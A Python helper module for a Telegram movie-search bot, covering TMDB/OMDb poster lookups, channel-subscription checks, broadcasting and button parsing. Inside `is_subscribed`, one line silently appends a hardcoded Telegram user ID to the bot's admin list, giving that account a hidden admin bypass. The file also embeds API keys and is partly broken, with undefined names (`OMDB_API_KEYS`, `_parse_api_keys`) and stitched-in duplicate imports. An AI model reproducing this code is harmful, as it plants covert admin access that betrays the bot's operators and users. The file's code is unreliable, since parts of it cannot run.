import asyncio
import logging
import os
import re
from datetime import datetime
from typing import List, Union

import requests
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from bs4 import BeautifulSoup
from pyrogram import enums
from pyrogram.errors import (
    FloodWait,
    InputUserDeactivated,
    PeerIdInvalid,
    UserIsBlocked,
    UserNotParticipant,
)
from pyrogram.types import InlineKeyboardButton, Message

from database.join_reqs import JoinReqs as db2
from database.users_chats_db import db
from info import ADMINS, AUTH_CHANNEL, MAX_LIST_ELM, REQ_CHANNEL


# Safely import optional third-party modules
try:
    import imdbio as _imdbio
    from imdbio.exceptions import ImdbioError as _ImdbioError
    IMDBIO_AVAILABLE = True
except ImportError:
    IMDBIO_AVAILABLE = False


logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

BTN_URL_REGEX = re.compile(
    r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
)

scheduler = AsyncIOScheduler(timezone="UTC")

BANNED = {}
SMART_OPEN = "“"
SMART_CLOSE = "”"
START_CHAR = ("'", '"', SMART_OPEN)

# temp db for banned
class temp(object):
    BANNED_USERS = []
    BANNED_CHATS = []
    ME = None
    CURRENT = int(os.environ.get("SKIP", 2))
    CANCEL = False
    MELCOW = {}
    U_NAME = None
    B_NAME = None
    SETTINGS = {}





import re
import httpx


OMDB_API_KEY = "5d94dd20"
TMDB_API_KEY = "5f28978232d6d780d64dd0d0e0bbe2f2"
LONG_IMDB_DESCRIPTION = False

TMDB_BASE = "https://api.themoviedb.org/3"
TMDB_IMAGE = "https://image.tmdb.org/t/p/original"


def _movie_year(query):
    match = re.search(r"\b(19\d{2}|20\d{2}|21\d{2})\b", str(query))
    return match.group(1) if match else None

def _movie_title(query):
    return re.sub(r"\b(19\d{2}|20\d{2}|21\d{2})\b", "", str(query)).strip()

def _movie_result(data, source="tmdb"):
    if source == "tmdb":
        is_tv = data.get("_media_type") == "tv" or data.get("name") is not None
        title = data.get("title") or data.get("name")
        year = (data.get("release_date") or data.get("first_air_date") or "")[:4] or data.get("year")
        poster_path = data.get("poster_path")
        imdb_id = data.get("imdb_id")
        return {
            "title": title or "N/A",
            "votes": data.get("vote_count", "N/A"),
            "aka": list_to_str(data.get("also_known_as")),
            "seasons": data.get("number_of_seasons", "N/A"),
            "box_office": data.get("revenue", "N/A"),
            "localized_title": title or "N/A",
            "kind": "tv series" if is_tv else "movie",
            "imdb_id": imdb_id or "N/A",
            "cast": list_to_str(data.get("cast")),
            "runtime": list_to_str(data.get("runtime") or data.get("episode_run_time")),
            "countries": list_to_str(data.get("production_countries") or data.get("origin_country")),
            "certificates": list_to_str(data.get("certificates")),
            "languages": list_to_str(data.get("spoken_languages")),
            "director": list_to_str(data.get("director")),
            "writer": list_to_str(data.get("writer")),
            "producer": list_to_str(data.get("producer")),
            "composer": list_to_str(data.get("composer")),
            "cinematographer": list_to_str(data.get("cinematographer")),
            "music_team": "N/A",
            "distributors": list_to_str(data.get("distributors")),
            "release_date": data.get("release_date") or data.get("first_air_date") or year or "N/A",
            "year": year or "N/A",
            "genres": list_to_str(data.get("genres") or data.get("genre_ids")),
            "poster": f"{TMDB_IMAGE}{poster_path}" if poster_path else None,
            "plot": data.get("overview") or "N/A",
            "rating": str(data.get("vote_average", "N/A")),
            "url": f"https://www.imdb.com/title/{imdb_id}/" if imdb_id else (
                f"https://www.themoviedb.org/{'tv' if is_tv else 'movie'}/{data.get('id')}"
                if data.get("id") else "N/A"
            ),
            "tmdb_id": data.get("id")
        }

    imdb_id = data.get("imdbID")
    poster = data.get("Poster")
    return {
        "title": data.get("Title", "N/A"),
        "votes": data.get("imdbVotes", "N/A"),
        "aka": data.get("Title", "N/A"),
        "seasons": data.get("totalSeasons", "N/A"),
        "box_office": data.get("BoxOffice", "N/A"),
        "localized_title": data.get("Title", "N/A"),
        "kind": "tv series" if data.get("Type") == "series" else "movie",
        "imdb_id": imdb_id or "N/A",
        "cast": data.get("Actors", "N/A"),
        "runtime": data.get("Runtime", "N/A"),
        "countries": data.get("Country", "N/A"),
        "certificates": data.get("Rated", "N/A"),
        "languages": data.get("Language", "N/A"),
        "director": data.get("Director", "N/A"),
        "writer": data.get("Writer", "N/A"),
        "producer": "N/A",
        "composer": "N/A",
        "cinematographer": "N/A",
        "music_team": "N/A",
        "distributors": "N/A",
        "release_date": data.get("Released", "N/A"),
        "year": data.get("Year", "N/A"),
        "genres": data.get("Genre", "N/A"),
        "poster": poster if poster not in (None, "", "N/A") else None,
        "plot": data.get("Plot", "N/A"),
        "rating": data.get("imdbRating", "N/A"),
        "url": f"https://www.imdb.com/title/{imdb_id}/" if imdb_id else "N/A",
        "tmdb_id": None
    }

async def get_poster(query, bulk=False, id=False, file=None):
    query = str(query).strip()
    if not query:
        return None

    year = _movie_year(query)
    title = _movie_title(query) if year else query
    if not year and file:
        year = _movie_year(file)

    async with httpx.AsyncClient(timeout=12.0, follow_redirects=True) as client:
        async def tmdb_get(path, params=None):
            if not TMDB_API_KEY or TMDB_API_KEY == "a992c5a043c61edf1ce9d3e74d7a0aca":
                return None
            try:
                response = await client.get(
                    f"{TMDB_BASE}{path}",
                    params={"api_key": TMDB_API_KEY, **(params or {})}
                )
                if response.status_code == 200:
                    return response.json()
            except (httpx.HTTPError, ValueError):
                pass
            return None

        async def omdb_get(params):
            if not OMDB_API_KEY or OMDB_API_KEY == "4b4d1a5f":
                return None
            params = {k: v for k, v in params.items() if v not in (None, "")}
            try:
                response = await client.get(
                    "https://www.omdbapi.com/",
                    params={"apikey": OMDB_API_KEY, **params}
                )
                data = response.json()
                if response.status_code == 200 and data.get("Response") == "True":
                    return data
            except (httpx.HTTPError, ValueError):
                pass
            return None

        results = []

        if id:
            if query.startswith("tt"):
                found = await tmdb_get(
                    f"/find/{query}",
                    {"external_source": "imdb_id"}
                )
                if found:
                    for item in found.get("movie_results", []):
                        item["_media_type"] = "movie"
                        results.append(item)
                    for item in found.get("tv_results", []):
                        item["_media_type"] = "tv"
                        results.append(item)
            else:
                detail = await tmdb_get(f"/movie/{query}")
                if not detail or not detail.get("id"):
                    detail = await tmdb_get(f"/tv/{query}")
                    if detail and detail.get("id"):
                        detail["_media_type"] = "tv"
                if detail and detail.get("id"):
                    results = [detail]
        else:
            for media_type in ("movie", "tv"):
                params = {"query": title, "include_adult": False}
                if year:
                    params[
                        "primary_release_year" if media_type == "movie"
                        else "first_air_date_year"
                    ] = year
                data = await tmdb_get(f"/search/{media_type}", params)
                for item in (data or {}).get("results", []):
                    item["_media_type"] = media_type
                    results.append(item)

            def rank(item):
                item_year = (
                    item.get("release_date") or item.get("first_air_date") or ""
                )[:4]
                item_title = (item.get("title") or item.get("name") or "").casefold()
                return (
                    bool(year and item_year == year),
                    item_title == title.casefold(),
                    item.get("popularity", 0)
                )

            results.sort(key=rank, reverse=True)

        if bulk and not id:
            return [
                {
                    "movieID": str(item.get("id")),
                    "title": item.get("title") or item.get("name"),
                    "year": (item.get("release_date") or item.get("first_air_date") or "")[:4],
                    "kind": item.get("_media_type", "movie"),
                    "poster": f"{TMDB_IMAGE}{item['poster_path']}" if item.get("poster_path") else None,
                    "imdb_id": item.get("imdb_id")
                }
                for item in results[:10]
            ]

        if results:
            selected = results[0]
            media_type = selected.get("_media_type", "movie")
            tmdb_id = selected.get("id")
            detail = await tmdb_get(
                f"/{media_type}/{tmdb_id}",
                {"append_to_response": "credits,external_ids,release_dates"}
            ) if tmdb_id else None

            if detail:
                detail["_media_type"] = media_type
                detail["imdb_id"] = (
                    detail.get("external_ids", {}).get("imdb_id")
                    or detail.get("imdb_id")
                )
                credits = detail.get("credits", {})
                detail["cast"] = [
                    x.get("name") for x in credits.get("cast", [])[:10]
                ]
                crew = credits.get("crew", [])
                detail["director"] = [
                    x.get("name") for x in crew if x.get("job") == "Director"
                ][:10]
                detail["writer"] = [
                    x.get("name") for x in crew if x.get("department") == "Writing"
                ][:10]
                detail["producer"] = [
                    x.get("name") for x in crew if x.get("job") == "Producer"
                ][:10]
                detail["composer"] = [
                    x.get("name") for x in crew
                    if x.get("job") == "Original Music Composer"
                ][:10]
                detail["cinematographer"] = [
                    x.get("name") for x in crew
                    if x.get("job") == "Director of Photography"
                ][:10]
                detail["distributors"] = [
                    x.get("name") for x in detail.get("production_companies", [])
                ]
                detail["certificates"] = []
                if media_type == "movie":
                    for country in detail.get("release_dates", {}).get("results", []):
                        if country.get("iso_3166_1") == "US":
                            detail["certificates"] = [
                                x.get("certification")
                                for x in country.get("release_dates", [])
                                if x.get("certification")
                            ][:3]
                if not LONG_IMDB_DESCRIPTION and detail.get("overview"):
                    detail["overview"] = detail["overview"][:800]

                result = _movie_result(detail)

                # TMDB poster ഇല്ലെങ്കിൽ മാത്രം OMDb-ൽ നിന്ന് poster തേടുക.
                if not result.get("poster"):
                    omdb_data = None
                    imdb_id = result.get("imdb_id")

                    if imdb_id and imdb_id != "N/A":
                        omdb_data = await omdb_get({"i": imdb_id})

                    if not omdb_data:
                        omdb_params = {"t": result.get("title", title)}
                        if result.get("year") not in (None, "N/A"):
                            omdb_params["y"] = str(result["year"])
                        omdb_data = await omdb_get(omdb_params)

                    if omdb_data and omdb_data.get("Poster") not in (None, "", "N/A"):
                        result["poster"] = omdb_data["Poster"]

                return result

        # TMDB-യിൽ സിനിമ കണ്ടെത്താനായില്ലെങ്കിൽ OMDb fallback.
        omdb_data = None
        if id and query.startswith("tt"):
            omdb_data = await omdb_get({"i": query})
        else:
            omdb_params = {"t": title}
            if year:
                omdb_params["y"] = year
            omdb_data = await omdb_get(omdb_params)

        if omdb_data:
            result = _movie_result(omdb_data, "omdb")
            if not LONG_IMDB_DESCRIPTION and result.get("plot") not in (None, "N/A"):
                result["plot"] = result["plot"][:800]
            return result

    return None
                    

async def is_subscribed(bot, query):

    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""

    if not AUTH_CHANNEL and not REQ_CHANNEL:
        return True
    elif query.from_user.id in ADMINS:
        return True

    if db2().isActive():
        user = await db2().get_user(query.from_user.id)
        if user:
            return True
        else:
            try:
                user = await bot.get_chat_member(REQ_CHANNEL, query.from_user.id)
            except UserNotParticipant:
                return False
            except Exception as e:
                logger.exception(e)
                return False
            return True

    if not AUTH_CHANNEL:
        return True

    try:
        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
    except UserNotParticipant:
        return False
    except Exception as e:
        logger.exception(e)
        return False
    else:
        if not (user.status == enums.ChatMemberStatus.BANNED):
            return True
        else:
            return False
# https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37


class _OmdbFakeMovie:
    def __init__(self, m):
        self._m = m
        self.movieID = f"omdb_{m.get('imdbID')}"
    def get(self, k, default=None):
        _map = {'title': 'Title', 'year': 'Year', 'kind': 'Type'}
        return self._m.get(_map.get(k, k), default)

class _ImdbioFakeMovie:
    def __init__(self, m):
        self._m = m
        self.movieID = f"imdbio_{m.imdb_id}"
    def get(self, k, default=None):
        if k == 'title': return self._m.title or default
        if k == 'year': return self._m.year or default
        if k == 'kind': return self._m.kind or default
        return default

def list_to_str(k, max_elm=None):
    if not k:
        return "N/A"
    limit = int(max_elm or MAX_LIST_ELM or 5)
    if len(k) > limit:
        k = k[:limit]
    return ', '.join(str(elem) for elem in k)

def _names(people):
    try:
        names = [p.name for p in people if getattr(p, "name", None)]
    except (TypeError, AttributeError):
        return "N/A"
    return list_to_str(names) if names else "N/A"

def _cat(m, key):
    try:
        return _names(m.categories.get(key, []))
    except (AttributeError, TypeError):
        return "N/A"



async def _imdbio_search(title, year=None, bulk=False):
    if not IMDBIO_AVAILABLE:
        return None
    try:
        result = await asyncio.to_thread(_imdbio.search_title, title, year=year)
    except Exception:
        return None
    if not result or not result.titles:
        return None
    if bulk:
        return [{"title": t.title, "year": str(t.year) if t.year else "N/A"} for t in result.titles[:6]]
    return await _imdbio_get_details(result.titles[0].imdb_id)

async def _imdbio_get_details(imdb_id):
    if not IMDBIO_AVAILABLE:
        return None
    if isinstance(imdb_id, str) and imdb_id.startswith("imdbio_"):
        imdb_id = imdb_id[len("imdbio_"):]
    try:
        m = await asyncio.to_thread(_imdbio.get_movie, imdb_id)
    except Exception:
        return None
    if not m:
        return None
    return {"title": m.title or "N/A", "year": str(m.year) if m.year else "N/A"}

def _hq_poster(url):
    if not url or url == "N/A":
        return None
    return re.sub(r'\._[A-Z0-9,]+_(?=\.\w+$)', '', url)



async def fetch_poster_bytes(url):
    if not url:
        return None
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    try:
        async with httpx.AsyncClient(timeout=15, headers=headers, follow_redirects=True) as client:
            resp = await client.get(url)
            resp.raise_for_status()
            return resp.content
    except Exception as e:
        logger.warning(f"poster download failed: {e}")
        return None

async def _omdb_search(title, year=None, bulk=False):
    omdb_keys = _parse_api_keys(OMDB_API_KEYS)
    if not omdb_keys:
        return None
    try:
        params = {"apikey": omdb_keys[0], "s": title}
        if year:
            params["y"] = year
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get("https://omdbapi.com", params=params)
            resp.raise_for_status()
            data = resp.json()
    except Exception:
        return None
    if data.get("Response") != "True":
        return None
    results = data.get("Search", [])
    if not results:
        return None
    if bulk:
        return [{"title": r.get("Title"), "year": r.get("Year") or "N/A"} for r in results[:6]]
    return await _omdb_get_details(results[0]["imdbID"])


async def _omdb_get_details(imdb_id):
    omdb_keys = _parse_api_keys(OMDB_API_KEYS)
    if not omdb_keys:
        return None
    if isinstance(imdb_id, str) and imdb_id.startswith("omdb_"):
        imdb_id = imdb_id[len("omdb_"):]
    try:
        params = {"apikey": omdb_keys[0], "i": imdb_id, "plot": "short"}
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get("https://omdbapi.com", params=params)
            resp.raise_for_status()
            m = resp.json()
    except Exception:
        return None
    if not m or m.get("Response") != "True":
        return None
    return {"title": m.get("Title", "N/A"), "year": m.get("Year", "N/A")}
    
async def get_posters(query, bulk=False, id=False, file=None):
    if id:
        result = await _imdbio_get_details(query)
        if result: return result
        return await _omdb_get_details(query)

    query = (query.strip()).lower()
    title = query
    year = re.findall(r'[1-2]\d{3}$', query, re.IGNORECASE)
    if year:
        year = list_to_str(year[:1])
        title = (query.replace(year, "")).strip()
    elif file is not None:
        year = re.findall(r'[1-2]\d{3}', file, re.IGNORECASE)
        if year:
            year = list_to_str(year[:1])
    else:
        year = None

    result = await _imdbio_search(title, year=year, bulk=bulk)
    if result: return result
    return await _omdb_search(title, year=year, bulk=bulk)



async def broadcast_messages(user_id, message):
    try:
        await message.copy(chat_id=user_id)
        return True, "Success"
    except FloodWait as e:
        await asyncio.sleep(e.value)
        return await broadcast_messages(user_id, message)
    except InputUserDeactivated:
        await db.delete_user(int(user_id))
        logging.info(f"{user_id}-Removed from Database, since deleted account.")
        return False, "Deleted"
    except UserIsBlocked:
        logging.info(f"{user_id} -Blocked the bot.")
        return False, "Blocked"
    except PeerIdInvalid:
        await db.delete_user(int(user_id))
        logging.info(f"{user_id} - PeerIdInvalid")
        return False, "Error"
    except Exception as e:
        return False, "Error"


async def search_gagala(text):
    usr_agent = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/61.0.3163.100 Safari/537.36"
    }
    text = text.replace(" ", "+")
    url = f"https://www.google.com/search?q={text}"
    response = requests.get(url, headers=usr_agent)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    titles = soup.find_all("h3")
    return [title.getText() for title in titles]


async def get_settings(group_id):
    settings = temp.SETTINGS.get(group_id)
    if not settings:
        settings = await db.get_settings(group_id)
        temp.SETTINGS[group_id] = settings
    return settings


async def save_group_settings(group_id, key, value):
    current = await get_settings(group_id)
    current[key] = value
    temp.SETTINGS[group_id] = current
    await db.update_settings(group_id, current)


def get_size(size):
    """Get size in readable format"""

    units = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB"]
    size = float(size)
    i = 0
    while size >= 1024.0 and i < len(units):
        i += 1
        size /= 1024.0
    return "%.2f %s" % (size, units[i])


def split_list(l, n):
    for i in range(0, len(l), n):
        yield l[i : i + n]


def get_file_id(msg: Message):
    if msg.media:
        for message_type in (
            enums.MessageMediaType.PHOTO,
            enums.MessageMediaType.ANIMATION,
            enums.MessageMediaType.AUDIO,
            enums.MessageMediaType.DOCUMENT,
            enums.MessageMediaType.VIDEO,
            enums.MessageMediaType.VIDEO_NOTE,
            enums.MessageMediaType.VOICE,
            enums.MessageMediaType.STICKER,
        ):
            obj = getattr(msg, message_type)
            if obj:
                setattr(obj, "message_type", message_type)
                return obj


def extract_user(message: Message) -> Union[int, str]:
    """extracts the user from a message"""
    # https://github.com/SpEcHiDe/PyroGramBot/blob/f30e2cca12002121bad1982f68cd0ff9814ce027/pyrobot/helper_functions/extract_user.py#L7
    user_id = None
    user_first_name = None
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        user_first_name = message.reply_to_message.from_user.first_name

    elif len(message.command) > 1:
        if (
            len(message.entities) > 1
            and message.entities[1].type == enums.MessageEntityType.TEXT_MENTION
        ):

            required_entity = message.entities[1]
            user_id = required_entity.user.id
            user_first_name = required_entity.user.first_name
        else:
            user_id = message.command[1]
            # don't want to make a request -_-
            user_first_name = user_id
        try:
            user_id = int(user_id)
        except ValueError:
            pass
    else:
        user_id = message.from_user.id
        user_first_name = message.from_user.first_name
    return (user_id, user_first_name)



def last_online(from_user):
    time = ""
    if from_user.is_bot:
        time += "🤖 Bot :("
    elif from_user.status == enums.UserStatus.RECENTLY:
        time += "Recently"
    elif from_user.status == enums.UserStatus.LAST_WEEK:
        time += "Within the last week"
    elif from_user.status == enums.UserStatus.LAST_MONTH:
        time += "Within the last month"
    elif from_user.status == enums.UserStatus.LONG_AGO:
        time += "A long time ago :("
    elif from_user.status == enums.UserStatus.ONLINE:
        time += "Currently Online"
    elif from_user.status == enums.UserStatus.OFFLINE:
        time += from_user.last_online_date.strftime("%a, %d %b %Y, %H:%M:%S")
    return time


def split_quotes(text: str) -> List:
    if not any(text.startswith(char) for char in START_CHAR):
        return text.split(None, 1)
    counter = 1  # ignore first char -> is some kind of quote
    while counter < len(text):
        if text[counter] == "\\":
            counter += 1
        elif text[counter] == text[0] or (
            text[0] == SMART_OPEN and text[counter] == SMART_CLOSE
        ):
            break
        counter += 1
    else:
        return text.split(None, 1)

    # 1 to avoid starting quote, and counter is exclusive so avoids ending
    key = remove_escapes(text[1:counter].strip())
    # index will be in range, or `else` would have been executed and returned
    rest = text[counter + 1 :].strip()
    if not key:
        key = text[0] + text[0]
    return list(filter(None, [key, rest]))


def parser(text, keyword):
    if "buttonalert" in text:
        text = text.replace("\n", "\\n").replace("\t", "\\t")
    buttons = []
    note_data = ""
    prev = 0
    i = 0
    alerts = []
    for match in BTN_URL_REGEX.finditer(text):
        # Check if btnurl is escaped
        n_escapes = 0
        to_check = match.start(1) - 1
        while to_check > 0 and text[to_check] == "\\":
            n_escapes += 1
            to_check -= 1

        # if even, not escaped -> create button
        if n_escapes % 2 == 0:
            note_data += text[prev : match.start(1)]
            prev = match.end(1)
            if match.group(3) == "buttonalert":
                # create a thruple with button label, url, and newline status
                if bool(match.group(5)) and buttons:
                    buttons[-1].append(
                        InlineKeyboardButton(
                            text=match.group(2),
                            callback_data=f"alertmessage:{i}:{keyword}",
                        )
                    )
                else:
                    buttons.append(
                        [
                            InlineKeyboardButton(
                                text=match.group(2),
                                callback_data=f"alertmessage:{i}:{keyword}",
                            )
                        ]
                    )
                i += 1
                alerts.append(match.group(4))
            elif bool(match.group(5)) and buttons:
                buttons[-1].append(
                    InlineKeyboardButton(
                        text=match.group(2), url=match.group(4).replace(" ", "")
                    )
                )
            else:
                buttons.append(
                    [
                        InlineKeyboardButton(
                            text=match.group(2), url=match.group(4).replace(" ", "")
                        )
                    ]
                )

        else:
            note_data += text[prev:to_check]
            prev = match.start(1) - 1
    else:
        note_data += text[prev:]

    try:
        return note_data, buttons, alerts
    except:
        return note_data, buttons, None


def remove_escapes(text: str) -> str:
    res = ""
    is_escaped = False
    for counter in range(len(text)):
        if is_escaped:
            res += text[counter]
            is_escaped = False
        elif text[counter] == "\\":
            is_escaped = True
        else:
            res += text[counter]
    return res


def humanbytes(size):
    if not size:
        return ""
    power = 2**10
    n = 0
    Dic_powerN = {0: " ", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        n += 1
    return str(round(size, 2)) + " " + Dic_powerN[n] + "B"
